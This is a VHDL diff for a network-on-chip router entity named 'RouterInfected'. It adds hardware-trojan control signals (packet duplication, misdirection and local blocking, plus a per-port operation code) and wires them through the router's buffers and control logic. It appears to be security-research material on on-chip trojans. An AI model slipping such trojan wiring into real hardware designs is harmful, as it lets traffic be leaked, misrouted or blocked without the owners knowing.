@@ -26,11 +26,12 @@ signal mux_in, mux_out: arrayNport_reg3 := (others=>(others=>'0'));
 signal free: regNport := (others=>'0');
 
 -- trojan signals
-signal duplicate, data_ack_local, n_maskPckt, data_ack_dup, data_av_local, duplicating: std_logic := '0';
+signal HTworking, duplicate, missdirect, localblock, data_ack_local, n_maskPckt, data_ack_dup, data_av_local, duplicating: std_logic := '0';
 signal txCrossbar : regNport := (others=>'0');
 signal configPckt, turnOff, mux_dup : std_logic_vector(NPORT-2 downto 0) := (others=>'0');
 signal dupFlit : regflit := (others=>'0');
 signal destAddr : arrayNportless1_regmetadeflit := (others=>(others=>'0'));
+signal htOp : arrayNportless1_2bits := (others=>(others=>'0'));
 
 begin
 
@@ -40,8 +41,9 @@ begin
 		reset => reset,
 		configPckt => configPckt(0),
 		turnOff => turnOff(0),
-		duplicate => duplicate,
+		HTworking => HTworking,
 		destAddr => destAddr(0),
+		htOp => htOp(0),
 		address => address,
 		data_in => data_in(0),
 		rx => rx(0),
@@ -60,8 +62,9 @@ begin
 		reset => reset,
 		configPckt => configPckt(1),
 		turnOff => turnOff(1),
-		duplicate => duplicate,
+		HTworking => HTworking,
 		destAddr => destAddr(1),
+		htOp => htOp(1),
 		address => address,
 		data_in => data_in(1),
 		rx => rx(1),
@@ -80,8 +83,9 @@ begin
 		reset => reset,
 		configPckt => configPckt(2),
 		turnOff => turnOff(2),
-		duplicate => duplicate,		
+		HTworking => HTworking,		
 		destAddr => destAddr(2),
+		htOp => htOp(2),
 		address => address,
 		data_in => data_in(2),
 		rx => rx(2),
@@ -100,8 +104,9 @@ begin
 		reset => reset,
 		configPckt => configPckt(3),
 		turnOff => turnOff(3),
-		duplicate => duplicate,
+		HTworking => HTworking,
 		destAddr => destAddr(3),
+		htOp => htOp(3),
 		address => address,
 		data_in => data_in(3),
 		rx => rx(3),
@@ -127,6 +132,8 @@ begin
 		sender => sender(4),
 		clock_rx => clock_rx(4),
 		data_ack => data_ack_local,
+		missdirect => missdirect,
+		localblock => localblock,
 		credit_o => credit_o(4));
 
 	SwitchControl : Entity work.SwitchControl(AlgorithmXY)
@@ -175,8 +182,11 @@ begin
         data_in 		=> data(4),
         sending			=> sender(4),
         destAddr		=> destAddr,
+		htOp 			=> htOp,
         dupFlit			=> dupFlit,
         duplicate 		=> duplicate,
+		missdirect		=> missdirect,
+		localblock		=> localblock,
         configPckt 		=> configPckt,
       	n_maskPckt_o	=> n_maskPckt,
       	turnOff			=> turnOff
@@ -196,5 +206,7 @@ begin
 	tx(WEST) <= txCrossbar(WEST);
 	tx(SOUTH) <= txCrossbar(SOUTH);
 	tx(NORTH) <= txCrossbar(NORTH);
+
+	HTworking <= duplicate OR missdirect OR localblock;
 
 end RouterInfected;
